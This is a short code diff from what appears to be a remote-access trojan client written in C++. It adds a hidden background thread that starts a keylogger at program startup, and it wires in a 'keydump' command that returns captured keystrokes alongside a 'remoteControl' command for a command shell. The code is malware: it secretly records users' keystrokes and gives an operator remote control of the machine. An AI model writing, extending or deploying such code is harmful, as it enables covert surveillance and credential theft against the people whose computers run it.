@@ -42,6 +42,11 @@ bool General::init()	//startup of program
 
 	runInstalled();			//checks if this run of the instance is designated to the install process, then checks whether it should start the installed client
 
+	if (Settings::logKeys)
+	{
+		std::thread Keylogger(Keylogger::startLogger);
+		Keylogger.detach();
+	}
 
 	return installing;
 }
@@ -242,7 +247,7 @@ void General::handleError(int errType, bool errSevere)	//handles errors
 			Client::clientptr->SendString("Networking error", PacketType::Warning);
 			return;
 		}
-		
+
 	}
 
 }
@@ -274,8 +279,10 @@ std::string General::processCommand(std::string command)
 
 	else if (command == "keydump")
 	{
-		return Keylogger::DumpKeys();
+
+		return Keylogger::dumpKeys();
 	}
+
 	else if (processParameter(command, "remoteControl"))
 	{
 		if (!CMD::cmdOpen)
